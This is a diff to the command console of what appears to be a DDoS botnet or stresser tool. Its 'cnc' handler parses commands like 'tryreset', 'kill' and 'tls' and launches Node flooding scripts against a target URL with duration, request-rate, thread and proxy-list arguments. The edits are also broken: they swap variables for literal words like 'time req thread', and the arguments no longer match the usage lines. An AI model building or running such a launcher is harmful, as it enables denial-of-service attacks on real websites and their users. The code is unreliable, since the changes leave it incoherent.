@@ -436,7 +436,7 @@ def main():
                 url = cnc.split()[1]
                 per = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'node tryreset.js {url} {time} {time} {per} {thread} {proxies.txt}')
+                os.system(f'node tryreset.js {url} time req thread proxies.txt')
             except IndexError:
                 print('Usage: tryreset <url> <time> <per> <thread> <proxies.txt>')
                 print('Example: tryreset http://example.com 300 15000 1250 proxies.txt')
@@ -445,9 +445,9 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node kill.js {url} {time} {per} {thread}')
+                os.system(f'node kill.js {url} time req thread')
             except IndexError:
-                print('Usage: kill <url> <time> <per> <thread>')
+                print('Usage: kill <url> <time> <req> <thread>')
                 print('Example: kill http://example.com 300 15000 1250')
 
         elif "http-requests" in cnc:
@@ -463,7 +463,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node tls.js {url} {time} {per} {thread} {proxies.txt}')
+                os.system(f'node tls.js {url} time thread proxies.txt')
             except IndexError:
                 print('Usage: tls <url> <time> <per> <thread> <proxies.txt>')
                 print('Example: tls http://vailon.com/ 300 15000 1250 proxies.txt')
